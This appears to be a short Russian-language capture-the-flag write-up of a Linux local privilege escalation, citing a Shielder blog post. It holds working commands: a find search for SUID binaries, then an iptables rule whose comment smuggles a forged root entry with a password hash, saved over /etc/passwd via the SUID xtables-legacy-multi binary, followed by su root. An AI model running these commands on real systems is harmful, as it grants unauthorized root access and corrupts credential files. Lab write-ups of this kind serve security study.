ищем suid файлы с помощью find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
видим /usb/sbin/xtables-legacy-multi который позволяет использовать iptables от root из-за suid bit
создадим новое правило с комментарием в котором будет храниться зашифрованный пароль root и сохраним правило  ([Shielder - путь от  к локальному повышению привилегий](https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/))
```
/usr/sbin/xtables-legacy-multi iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nroot:$y$j9T$z76mX<hash>wI3i4tmx.X6cpNEXVE7IWF.QCE0PAJxJ1L1f2:0:0:root:/root:/bin/bash\n'

/usr/sbin/xtables-legacy-multi iptables-save -f /etc/passwd

```
![](../../attachment/Pasted%20image%2020250620100333.png)

теперь можем зайти под пользователем su root и забрать флаг

